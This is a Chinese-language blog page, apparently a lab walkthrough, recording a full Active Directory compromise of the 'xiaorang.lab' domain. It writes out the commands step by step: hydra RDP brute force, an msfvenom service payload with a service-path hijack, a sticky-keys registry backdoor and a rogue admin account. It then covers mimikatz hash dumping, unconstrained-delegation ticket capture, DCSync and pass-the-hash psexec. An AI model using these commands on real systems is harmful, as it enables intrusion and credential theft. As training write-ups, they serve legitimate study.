@@ -1,0 +1,424 @@
+<!DOCTYPE html>
+<html lang="zh">
+  <head prefix="og: https://ogp.me/ns#">
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="color-scheme" content="light dark">
+  
+  <title>Delegation - DashingBug</title>
+  
+    <link rel="shortcut icon" href="/./bug.png">
+  
+  
+  <link rel='manifest' href='/manifest.json'>
+  
+
+  
+  
+  
+  <meta property="og:title" content="Delegation - DashingBug" />
+  
+  <meta property="og:type" content="article" />
+  
+  <meta property="og:url" content="http://dashingbug.xin/2026/03/16/Delegation/index.html" />
+  
+  <meta property="og:image" content="/favicon.png" />
+  
+  <meta property="og:article:published_time" content="2026-03-15T16:00:00.000Z" />
+  
+  <meta property="og:article:author" content="DashingBug" />
+  
+  
+
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/simple-icons-font@v13/font/simple-icons.min.css">
+
+  
+  
+  
+<link rel="stylesheet" href="https://unpkg.com/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
+
+  
+
+  
+<link rel="stylesheet" href="/css/var.css">
+
+  
+<link rel="stylesheet" href="/css/main.css">
+
+  
+<link rel="stylesheet" href="/css/typography.css">
+
+  
+<link rel="stylesheet" href="/css/code-highlighting.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/components/card.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/button.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/badge.css">
+
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/components/utilities.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/nav.css">
+
+  
+<link rel="stylesheet" href="/css/paginator.css">
+
+  
+<link rel="stylesheet" href="/css/footer.css">
+
+  
+<link rel="stylesheet" href="/css/post-list.css">
+
+  
+  
+<link rel="stylesheet" href="/css/rainbow-banner.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/toc.css">
+
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/post.css">
+
+  
+  
+  
+  
+  
+  
+  
+<link rel="stylesheet" href="/css/scroll-reveal.css">
+
+  
+  
+  
+<link rel="stylesheet" href="/css/view-transition.css">
+
+  
+  
+  <script src="https://unpkg.com/lenis@1.1.9/dist/lenis.min.js"></script>
+  
+<link rel="stylesheet" href="https://unpkg.com/lenis@1.1.9/dist/lenis.css">
+
+  
+<script src="/js/smooth-scroll.js"></script>
+
+  
+
+  
+
+  <script>var ThemeCupertino = {}</script>
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+  <body
+    data-color-scheme="auto"
+    data-uppercase-categories="true"
+    
+    data-rainbow-banner="true"
+    data-rainbow-banner-shown="always"
+    data-rainbow-banner-month="6"
+    data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
+    
+    data-config-root="/"
+    
+    data-toc="true"
+    data-toc-max-depth="2"
+    
+    
+    
+    data-scroll-reveal-disappear="false"
+    data-scroll-reveal-query=".scroll-reveal, .post-list-item, .card, .content p img, .content .block-large img"
+    
+  >
+    <a href="#main-content" id="skip-to-content">Skip to content</a>
+    <nav id="theme-nav">
+  <div class="inner">
+    <a class="title" href="/">Space</a>
+    <div class="nav-arrow"></div>
+    <div class="nav-items">
+      <a class="nav-item nav-item-home" href="/" style="--index: 0">Home</a>
+
+      
+      <a class="nav-item" href="/archives" style="--index: 1">Archives</a>
+      
+      <a class="nav-item" href="http://dashingbug.xin/link/link.html" style="--index: 2">link</a>
+      
+      <a class="nav-item" href="/projects" style="--index: 3">Projects</a>
+      
+      <a class="nav-item" href="/about" style="--index: 4">About</a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://github.com/MrWillCom" style="--index: 5"><i class="si si-github"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" style="--index: 6"><i class="si si-codepen"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" style="--index: 7"><i class="si si-patreon"></i></a>
+      
+      <a class="nav-item is-icon" target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" style="--index: 8"><i class="si si-mastodon"></i></a>
+      
+      <a class="nav-item is-icon" href="/search" style="--index: 9"><i class="bi bi-search"></i></a>
+      
+    </div>
+  </div>
+</nav>
+
+    <main id="main-content">
+      
+<article class="post">
+  <div class="meta">
+    
+
+    
+    <time class="date" datetime="2026-03-16T00:00:00+08:00">
+      March 16, 2026
+    </time>
+    
+
+    <h1 class="title">Delegation</h1>
+  </div>
+
+  <div class="content">
+    <p>cve-2021-42643成功上马</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316153251144.png" alt="image-20260316153244067"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316153653227.png" alt="image-20260316153653198"></p>
+<p>需要提权</p>
+<p>在<a target="_blank" rel="noopener" href="https://gtfobins.org/">GTFOBins</a>搜索了一下发现diff能读文件</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316154047383.png" alt="image-20260316154047348"></p>
+<p>拿到了flag和一个hint:WIN19&#x2F;Adrian</p>
+<p>扫一下内网</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316154947480.png" alt="image-20260316154947444"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">172.22.4.7 DC01</span><br><span class="line">172.22.4.45 XIAORANG\WIN19</span><br><span class="line">172.22.4.19 FILESERVER</span><br><span class="line">172.22.4.36 当前WEB服务器</span><br></pre></td></tr></table></figure>
+
+<p>提示让我们打WIN19,<img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316162700529.png" alt="image-20260316162700500"></p>
+<p>扫出来3389开着，提示WIN&#x2F;Adrian I will do whatever I can to rock you,感觉是要让我们爆破Adrian的密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains hydra 172.22.4.45 rdp -l Adrian -P rockyou.txt</span><br></pre></td></tr></table></figure>
+
+<p>成功爆破出来后登录显示</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316163030167.png" alt="image-20260316163030138"></p>
+<p>用kali的rdesktop能修改密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains rdesktop 172.22.4.45</span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316163247553.png" alt="image-20260316163247418"></p>
+<p>将密码改成123456W</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316164127670.png" alt="image-20260316164127622"></p>
+<p>桌面上直接就有一个工具PrivescCheck，上网搜一下如何使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">PS C:\Temp\&gt; Set-ExecutionPolicy Bypass -Scope Process -Force </span><br><span class="line"></span><br><span class="line">PS C:\Temp\&gt; . .\Invoke-PrivescCheck.ps1; Invoke-PrivescCheck</span><br></pre></td></tr></table></figure>
+
+<p>扫出来两个高危提权漏洞</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316165123005.png" alt="image-20260316165122934"></p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316165540762.png" alt="image-20260316165540688"></p>
+<p>msfvenom能生成各种平台的payload文件，用于渗透测试中的有效载荷植入，后门生成，漏洞利用链条构成等</p>
+<p>在kali上运行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/exec cmd=&quot;C:\windows\system32\cmd.exe /c C:\Users\Adrian\Desktop\bad.bat&quot; --platform windows -f exe-service &gt; bad.exe</span><br></pre></td></tr></table></figure>
+
+<p>将生成的bad.exe上传到目标主机</p>
+<p>在目标主机创建bad.bat</p>
+<p>文件内容为</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">REG ADD &quot;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe&quot; /v Debugger /t REG_SZ /d &quot;C:\windows\system32\cmd.exe&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Adrian\Desktop&gt;reg add &quot;HKLM\SYSTEM\CurrentControlSet\Services\gupdate&quot; /t REG_EXPAND_SZ /v ImagePath /d &quot;C:\Users\Adrian\Desktop\bad.exe&quot; /f</span><br><span class="line">操作成功完成。</span><br><span class="line"></span><br><span class="line">C:\Users\Adrian\Desktop&gt;sc start gupdate</span><br><span class="line">C:\Users\Adrian\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+<p>我按在Windows上执行的顺序解释一下这几步</p>
+<p>1.扫描出来用户可修改gupdate服务配置，因为Windows服务默认以**<code>NT AUTHORITY\SYSTEM</code>** 账户运行，<code>ImagePath</code> 是服务配置中最核心的参数，它告诉 Windows “这个服务启动时要运行哪个可执行文件”，如果将ImagePath修改为bad.exe，那在启动gupdate服务的时候就将以管理员权限运行bad.exe</p>
+<p>2.生成的bad.exe的载荷是C:\windows\system32\cmd.exe &#x2F;c C:\Users\Adrian\Desktop\bad.bat，运行bad.exe的时候就会执行bad.bat</p>
+<p>3.bad.bat的内容将粘滞键（连按5次shift）的启动程序修改为cmd.exe</p>
+<p>4.总结下来就是说首先利用漏洞将gupdate的启动程序修改为bad.exe,bad.exe会运行bad.bat，bad.bat会修改粘滞键的启动程序，</p>
+<p>登录界面的进程是由 <code>winlogon.exe</code> 管理的，它运行的上下文环境是 SYSTEM 权限。因此，此时弹出的 cmd 窗口也拥有 SYSTEM 权限</p>
+<p>在远程登陆界面连按五次shift出现管理员cmd</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316174614942.png" alt="image-20260316174614817"></p>
+<p>创建管理员方便权限维持</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">net user bug 123456W /add</span><br><span class="line">net localgroup administrators bug /add</span><br></pre></td></tr></table></figure>
+
+<p>mimikatz抓一下哈希</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316180548675.png" alt="image-20260316180548608"></p>
+<p>域用户WIN19哈希a42550d7f90f76b0fadd51795a3f1be9</p>
+<p>用Adinfo_win.exe看一下委派关系</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\bug\Desktop&gt;Adinfo_win.exe -d xiaorang.lab --dc 172.22.4.7 -u WIN19$ -H a42550d7f90f76b0fadd51795a3f1be9</span><br><span class="line"></span><br><span class="line">           _____  _        __</span><br><span class="line">     /\   |  __ \(_)      / _|</span><br><span class="line">    /  \  | |  | |_ _ __ | |_ ___</span><br><span class="line">   / /\ \ | |  | | | &#x27;_ \|  _/ _ \     Tools that collect information from domain</span><br><span class="line">  / ____ \| |__| | | | | | || (_) |</span><br><span class="line"> /_/    \_\_____/|_|_| |_|_| \___/     v1.5 by lzz</span><br><span class="line"></span><br><span class="line">[i] Try to connect &#x27;172.22.4.7&#x27;</span><br><span class="line">[c] Auth Domain: xiaorang.lab</span><br><span class="line">[c] Auth user: WIN19$</span><br><span class="line">[c] Auth hash: a42550d7f90f76b0fadd51795a3f1be9</span><br><span class="line">[c] connected successfully,try to dump domain info</span><br><span class="line">[i] DomainVersion found!</span><br><span class="line">                    [+] Windows 2016 Server operating system</span><br><span class="line">[i] Domain SID:</span><br><span class="line">                    [+] S-1-5-21-1913786442-1328635469-1954894845</span><br><span class="line">[i] Domain MAQ found</span><br><span class="line">                    [+] 10</span><br><span class="line">[i] Domain Account Policy found</span><br><span class="line">                    [+] pwdHistory: 24</span><br><span class="line">                    [+] minPwdLength: 7</span><br><span class="line">                    [+] minPwdAge: 1(day)</span><br><span class="line">                    [+] maxPwdAge: 42(day)</span><br><span class="line">                    [+] lockoutThreshold: 0</span><br><span class="line">                    [+] lockoutDuration: 30(min)</span><br><span class="line">[i] Domain Controllers: 1 found</span><br><span class="line">                    [+] DC01$  ==&gt;&gt;&gt;   Windows Server 2016 Datacenter  [10.0 (14393)]  ==&gt;&gt;&gt;  172.22.4.7</span><br><span class="line">[i] ADCS has not found!</span><br><span class="line">[i] Domain Exchange Server: 0 found</span><br><span class="line">[i] Domain All DNS:</span><br><span class="line">                    [+] Domain Dns 3 found,Saved in All_DNS.csv</span><br><span class="line">[i] Domain Trusts: 0 found</span><br><span class="line">[i] SPN: 39 found</span><br><span class="line">[i] Domain GPOs: 2 found</span><br><span class="line">[i] Domain Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Enterprise Admins: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] administrators: 1 users found</span><br><span class="line">                    [+]Administrator</span><br><span class="line">[i] Backup Operators: 0 users found</span><br><span class="line">[i] Users: 6 found</span><br><span class="line">[i] User with Mail: 0 found</span><br><span class="line">[i] Only_name_and_Useful_Users: 3 found</span><br><span class="line">[i] Only_admincount=1_andUseful_Users: 1 found</span><br><span class="line">[i] Locked Users: 0 found</span><br><span class="line">[i] Disabled Users: 3 found</span><br><span class="line">[i] Users with passwords not set to expire: 2 found</span><br><span class="line">[i] Domain Computers: 5 found</span><br><span class="line">[i] Only_name_and_Useful_computers: 5 found</span><br><span class="line">[i] Groups: 49 found</span><br><span class="line">[i] Domain OUs: 1 found</span><br><span class="line">[i] LAPS Not found</span><br><span class="line">[i] LAPS passwords: 0 found</span><br><span class="line">[i] SensitiveDelegate Users: 0 found</span><br><span class="line">[i] AsReproast Users: 0 found</span><br><span class="line">[i] Kerberoast Users: 1 found</span><br><span class="line">                    [+] CN=krbtgt,CN=Users,DC=xiaorang,DC=lab  ==&gt;&gt;&gt;  kadmin/changepw</span><br><span class="line">[i] SIDHistory Users: 0 found</span><br><span class="line">[i] CreatorSID Users: 2 found</span><br><span class="line">                    [+] WIN-3X7U15C2XDM$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">                    [+] WIN-YUUAW2QG9MF$  ==&gt;&gt;&gt;  Marcus</span><br><span class="line">[i] RBCD Users: 0 found</span><br><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">                    [+] WIN19$</span><br><span class="line">[i] Constrained Deligation Users: 0 found</span><br><span class="line">[i] Krbtgt password last set time: 2022-06-22 22:54:34 +0800 CST</span><br><span class="line">[i] CSVs written to &#x27;csv&#x27; directory in C:\Users\bug\Desktop</span><br><span class="line">[i] Execution took 1.0284023s</span><br><span class="line"></span><br><span class="line">C:\Users\bug\Desktop&gt;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[i] Unconstrained Deligation Users: 1 found</span><br><span class="line">    [+] WIN19$</span><br></pre></td></tr></table></figure>
+
+<p>WIN19$有非约束性委派</p>
+<p>Rubeus监听一下monitor</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316182710812.png" alt="image-20260316182710766"></p>
+<p>用dfscoerce让DC向WIN19$认证</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316183313864.png" alt="image-20260316183313814"></p>
+<p>成功拿到票据</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316183501541.png" alt="image-20260316183501478"></p>
+<p>将得到的票据base64解码转储为kirbi</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">certutil -f -decode aaa.txt aaa.kirbi</span><br></pre></td></tr></table></figure>
+
+<p>用mimikatz进行Dcsync</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe <span class="string">&quot;kerberos::purge&quot;</span> <span class="string">&quot;kerberos::ptt aaa.kirbi&quot;</span> <span class="string">&quot;lsadump::dcsync /domain:xiaorang.lab /all /csv&quot;</span> <span class="string">&quot;exit&quot;</span></span><br></pre></td></tr></table></figure>
+
+<p>成功拿到域控哈希4889f6553239ace1f7c47fa2c619c252</p>
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316184120640.png" alt="image-20260316184120592"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q  psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 Administrator@172.22.4.7</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316185727230.png" alt="image-20260316185727176"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 -q  psexec.py -hashes :4889f6553239ace1f7c47fa2c619c252 xiaorang/Administrator@172.22.4.19</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://dashingbug.oss-cn-beijing.aliyuncs.com/blog/20260316190133604.png" alt="image-20260316190133548"></p>
+
+  </div>
+
+  
+  <div class="about">
+    <h1>About this Post</h1>
+    <div class="details">
+      <p>This post is written by DashingBug, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
+    </div>
+    
+  </div>
+  
+
+  <div class="container post-prev-next">
+    
+    <a href="/2026/03/17/Privilege/" class="next">
+      <div class="text">
+        <p class="label">Next</p>
+        <h3 class="title">Privilege</h3>
+      </div>
+    </a>
+    
+    
+    <a href="/2026/03/11/Brute4Road/" class="prev">
+      <div class="text">
+        <p class="label">Previous</p>
+        <h3 class="title">Brute4Road</h3>
+      </div>
+    </a>
+    
+  </div>
+
+  
+    
+    
+  
+</article>
+
+
+    </main>
+    <footer>
+  <div class="inner">
+    <div class="links">
+      
+      <div class="group">
+        <h2 class="title">Blog</h2>
+        
+        <a href="/" class="item">Home</a>
+        
+        <a href="/archives" class="item">Archives</a>
+        
+        <a href="/tags" class="item">Tags</a>
+        
+        <a href="/categories" class="item">Categories</a>
+        
+        <a href="/search" class="item">Search</a>
+        
+        <a href="/links" class="item">link</a>
+        
+        <a href="/projects" class="item">Projects</a>
+        
+        <a href="/resume" class="item">Resume</a>
+        
+        <a href="/about" class="item">About</a>
+        
+        <a href="/atom.xml" class="item">RSS</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Projects</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/next-mastodon-gallery" class="item">Next Mastodon Gallery</a>
+        
+      </div>
+      
+      <div class="group">
+        <h2 class="title">Me</h2>
+        
+        <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
+        
+        <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
+        
+        <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
+        
+        <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
+        
+        <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
+        
+      </div>
+      
+    </div>
+    <span>&copy; 2026 DashingBug<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a></span>
+    
+    
+      <br>
+      <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
+        <label>
+          <input type="radio" value="light">
+          <span>Light</span>
+        </label>
+        <label>
+          <input type="radio" value="dark">
+          <span>Dark</span>
+        </label>
+        <label>
+          <input type="radio" value="auto">
+          <span>Auto</span>
+        </label>
+      </div>
+    
+  </div>
+</footer>
+
+
+    
+<script src="/js/main.js"></script>
+
+
+    
+
+    
+    
+<script src="/js/scroll-reveal.js"></script>
+
+    
+
+    
+
+    
+
+    
+  </body>
+</html>
